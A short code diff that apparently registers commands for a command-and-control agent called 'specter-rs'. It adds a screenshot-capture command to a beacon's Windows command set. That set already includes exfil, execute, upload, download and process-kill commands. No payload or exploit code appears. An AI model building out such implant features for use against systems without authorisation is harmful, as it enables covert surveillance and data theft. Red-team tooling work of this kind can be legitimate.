@@ -37,6 +37,8 @@ function RegisterCommands(listenerType)
 
     let cmd_disks = ax.create_command("disks", "Lists mounted drives on current system", "disks", "Task: show mounted disks");
 
+    let cmd_screenshot = ax.create_command("screenshot", "Capture a screenshot of the current display", "screenshot", "Task: capture screenshot");
+
     let _cmd_ps_list = ax.create_command("list", "List of processes", "ps list", "Task: show process list");
     let _cmd_ps_kill = ax.create_command("kill", "Kill a process", "ps kill 1234", "Task: kill process");
     _cmd_ps_kill.addArgInt("pid", true);
@@ -87,7 +89,7 @@ function RegisterCommands(listenerType)
     cmd_terminate.addSubCommands([_cmd_terminate_thread, _cmd_terminate_process]);
 
     if(listenerType == "BeaconHTTP") {
-        let commands_http = ax.create_commands_group("specter-rs", [cmd_pwd, cmd_cd, cmd_ls, cmd_cat, cmd_mkdir, cmd_rm, cmd_cp, cmd_mv, cmd_getuid, cmd_disks, cmd_ps, cmd_jobs, cmd_download, cmd_upload, cmd_exfil, cmd_execute, cmd_sleep, cmd_terminate]);
+        let commands_http = ax.create_commands_group("specter-rs", [cmd_pwd, cmd_cd, cmd_ls, cmd_cat, cmd_mkdir, cmd_rm, cmd_cp, cmd_mv, cmd_getuid, cmd_disks, cmd_screenshot, cmd_ps, cmd_jobs, cmd_download, cmd_upload, cmd_exfil, cmd_execute, cmd_sleep, cmd_terminate]);
         return { commands_windows: commands_http }
     }
 
